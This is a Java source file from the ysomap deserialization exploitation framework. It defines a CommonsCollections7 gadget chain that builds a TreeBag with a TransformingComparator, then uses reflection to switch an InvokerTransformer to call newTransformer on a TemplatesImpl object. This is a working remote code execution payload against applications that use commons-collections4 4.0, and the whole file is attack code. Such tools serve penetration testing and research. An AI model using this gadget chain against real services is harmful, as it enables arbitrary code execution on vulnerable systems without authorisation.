package ysomap.gadget.payload.collections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysomap.PayloadTester;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.TemplatesImplBullet;
import ysomap.gadget.payload.Payload;
import ysomap.util.Reflections;

/**
 * from ysoserial CommonsCollection8
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.NAVALORENZO })
public class CommonsCollections7 extends Payload<TreeBag> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof TemplatesImpl;
    }

    @Override
    public TreeBag pack(Object obj) throws Exception {
        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(obj);

        // arm transformer
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        return tree;
    }

    public static void main(String[] args) {
        ObjectGadget bullet = new TemplatesImplBullet(null);
        new PayloadTester(CommonsCollections7.class)
                .setBullet(bullet)
                .run();
    }
}
